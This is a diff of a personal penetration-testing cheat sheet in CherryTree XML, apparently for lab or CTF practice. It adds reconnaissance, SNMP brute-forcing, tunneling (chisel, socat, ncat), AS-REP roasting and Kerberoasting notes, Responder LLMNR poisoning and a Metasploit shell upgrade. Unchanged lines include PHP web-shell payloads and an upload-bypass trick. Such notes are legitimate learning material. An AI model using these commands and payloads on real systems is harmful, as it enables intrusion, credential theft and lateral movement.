@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1638663411">
+  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1639079075">
     <rich_text scale="h3" weight="heavy">SQL Injection</rich_text>
     <rich_text>
 
@@ -271,12 +271,54 @@ wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-
 
 
 </rich_text>
+    <rich_text scale="h2" weight="heavy">General Reconnaissance</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">Host Discovery</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text weight="heavy">
+</rich_text>
+    <rich_text>nmap -sP &lt;subnet&gt;
+
+netdiscover -i &lt;network_interface&gt; -r &lt;ip_range&gt;
+
+
+</rich_text>
+    <rich_text weight="heavy">Domain Discovery</rich_text>
+    <rich_text>
+
+nslookup &lt;ip_address&gt;
+
+dig @&lt;host1_ip&gt; -x &lt;another_host_ip&gt; +nocookie
+
+dig @&lt;ip&gt; &lt;domain&gt; -t AXFR +nocookie
+
+
+</rich_text>
+    <rich_text weight="heavy">Identify default gateway of a host/subnet</rich_text>
+    <rich_text>
+route
+
+traceroute &lt;ip&gt; -m 5 -T</rich_text>
+    <rich_text weight="heavy">
+</rich_text>
+    <rich_text>
+
+</rich_text>
     <rich_text scale="h2" weight="heavy">General Enumeration</rich_text>
     <rich_text>
 
 </rich_text>
     <rich_text weight="heavy">SNMP</rich_text>
     <rich_text>
+
+BRUTE-FORCE COMMUNITIES
+onesixtyone -c &lt;wordlist&gt; -p 161 &lt;host&gt;
+
+ENUMERATE WINDOWS USERS
+snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 10.10.10.5 1.3.6.1.4.1.77.1.2.25
 
 nmap -sU -p 161 --script=snmp-win32-services &lt;host&gt;
 
@@ -285,8 +327,6 @@ nmap -sU -p 161 &lt;host&gt; --script snmp-brute (/usr/share/nmap/nselib/data/sn
 
 List software installed on the machine
 snmpwalk -c &lt;community_string&gt; -v1 &lt;host&gt; hrSWInstalledName
-
-
 
 </rich_text>
     <rich_text weight="heavy">SMB</rich_text>
@@ -301,11 +341,6 @@ user &lt;user&gt;
 pass &lt;pass&gt;
 list
 retr &lt;email id&gt;
-
-</rich_text>
-    <rich_text weight="heavy">SNMP</rich_text>
-    <rich_text>
-nmap -sU -p 161 -sV -sC -A 192.168.201.25
 
 </rich_text>
     <rich_text weight="heavy">Send files</rich_text>
@@ -446,50 +481,6 @@ SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/wordpr
 
 echo "&lt;pre&gt;";system("ls -la /var/www");echo"&lt;\pre&gt;";
 
-
-
-</rich_text>
-    <rich_text weight="heavy">Pivoting &amp; Port Forwarding</rich_text>
-    <rich_text>
-
-curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
-
-socks5 127.0.0.1 8080 &gt;&gt; /etc/proxychains4
-
-
-ssh -L 3000:homepc:23 user@ssh-server
-localport:remotehost:remoteport
-
-</rich_text>
-    <rich_text style="italic">ncat -l -v -p 2222 -c 'ncat 172.16.50.222 22'</rich_text>
-    <rich_text>
-
-
-</rich_text>
-    <rich_text weight="heavy">SSH (22) through Squid Proxy (3128)</rich_text>
-    <rich_text>
-proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
-
-there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost
-
-then ssh user@127.0.0.1 -p 1234
-
-
-
-</rich_text>
-    <rich_text weight="heavy">Tunneling with Chisel</rich_text>
-    <rich_text>
-
-On local machine;
-chisel server -p 8001 --reverse
-
-On foothold attacked machine;
-./chisel client lhost:8001 R:8000:127.0.0.1:8000
-
-8000 é a porta que tava aberta só pra localhost no alvo, e 8001 é a porta que ficou escutando na minha máquina.
-
-remote:8000 -&gt; local:8001 -&gt; local:8000
-
  
 </rich_text>
     <rich_text weight="heavy">File Upload Bypass Magic Bytes</rich_text>
@@ -498,9 +489,6 @@ That makes so that the file header is a jpeg, the extension a gif and the conten
  
  echo 'FFD8FFEo' | xxd -r -p &gt; xca.gif
  echo '&lt;?php $c=$_GET['c']; echo `$c`; ?&gt;' &gt;&gt; xca.gif
-
-
-
 
 
 </rich_text>
@@ -533,6 +521,60 @@ set pwd='admin' where login='admin';
 ssh mindy@192.168.201.19 -t "bash --noprofile"
 
 
+</rich_text>
+    <rich_text scale="h3" weight="heavy">Pivoting &amp; Port Forwarding</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text weight="heavy">Socat</rich_text>
+    <rich_text>
+socat TCP-LISTEN:&lt;local_port&gt;,fork,reuseaddr TCP:&lt;remote_ip&gt;:&lt;remote_port&gt; &amp;
+
+</rich_text>
+    <rich_text weight="heavy">cURL</rich_text>
+    <rich_text>
+curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
+
+</rich_text>
+    <rich_text weight="heavy">SSH</rich_text>
+    <rich_text>
+ssh -L 3000:homepc:23 user@ssh-server
+localport:remotehost:remoteport
+
+</rich_text>
+    <rich_text weight="heavy">Ncat</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text style="italic">ncat -l -v -p 2222 -c 'ncat 172.16.50.222 22'</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text weight="heavy">SSH (22) through Squid Proxy (3128)</rich_text>
+    <rich_text>
+proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
+
+there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost
+
+then ssh user@127.0.0.1 -p 1234
+
+
+</rich_text>
+    <rich_text weight="heavy">Tunneling with Chisel</rich_text>
+    <rich_text>
+
+On local machine;
+chisel server -p 8001 --reverse
+
+On foothold attacked machine;
+./chisel client lhost:8001 R:8000:127.0.0.1:8000
+
+8000 é a porta que tava aberta só pra localhost no alvo, e 8001 é a porta que ficou escutando na minha máquina.
+
+remote:8000 -&gt; local:8001 -&gt; local:8000
+
+
 
 </rich_text>
     <rich_text family="monospace" scale="h3" background="#ffffffffffff" foreground="#000000000000">Metasploit</rich_text>
@@ -562,6 +604,66 @@ meterpreter &gt; shell
     <rich_text>
 net use K: \\destiny_ip\share
 K:
+
+
+
 </rich_text>
+    <rich_text scale="h3" weight="heavy">Active Directory</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">AS-Rep Roasting</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text style="italic">Authentication Server Request (AS-Req)</rich_text>
+    <rich_text>
+Client asks the Kerberos Key Distribution Center for a ticket-granting ticket, sending an encrypted timestamp along with the request. 
+
+</rich_text>
+    <rich_text style="italic">Authentication Server Reply (AS-Rep)</rich_text>
+    <rich_text>
+The KDC responds with a ticket-granting ticket for the client, and part of that reply contains data encrypted which contains the client's password, so it's possible to crack this hash
+
+When Kerberos pre-auth is disabled, the AS-Req is not going to send the encrypted timestamp, so it's not necessary to know the victim's password to get the AS-Rep back.
+
+• You need to know some valid usernames or at least their strucute (John Smith could be jsmith, johnm and so on)
+
+
+</rich_text>
+    <rich_text scale="h3" weight="heavy">Kerberoasting</rich_text>
+    <rich_text>
+
+Service Principal Names (SPNs) are used by Kerberos Authentication to associate a service instance with a service logon account. The SPN acts as a pointer to the domain account running the service.
+
+SPN Example
+service/machine@domain
+MSSQLsvc/sql1@ad.local
+
+
+</rich_text>
+    <rich_text weight="heavy">LLMNR Poisoning</rich_text>
+    <rich_text>
+
+responder -I &lt;network_interface&gt;
+
+</rich_text>
+    <rich_text weight="heavy">Impersonate user with Responder-MultiRelay</rich_text>
+    <rich_text>
+
+multirelay -t &lt;machine_ip&gt; -u ALL
+
+</rich_text>
+    <rich_text weight="heavy">Upgrade Shell to Meterpreter</rich_text>
+    <rich_text>
+
+exploit/multi/scripts/web_delivery
+
+set srvhost, target 2, payload, lhost, lport, exitonsession, exploit -j
+
+
+
+Close port
+sudo kill $(sudo lsof -t -i:445)</rich_text>
   </node>
 </cherrytree>
